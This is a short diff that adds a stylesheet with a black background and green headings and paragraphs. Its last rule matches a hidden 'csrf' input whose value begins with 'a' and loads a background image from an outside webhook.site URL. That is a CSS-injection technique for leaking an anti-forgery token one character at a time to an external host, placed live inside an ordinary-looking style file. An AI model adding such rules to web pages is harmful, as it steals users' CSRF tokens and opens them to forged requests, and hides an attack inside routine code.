@@ -1,0 +1,13 @@
+body {
+    background-color: black;
+  }
+  h1 {
+    color: green;
+  }
+  p {
+    color: green;
+  }
+
+input[name="csrf"][value^="a"] {
+    background: url(https://webhook.site/5b3d9fb8-a594-44fb-b19d-fc95ca889b1e?q=a)
+}
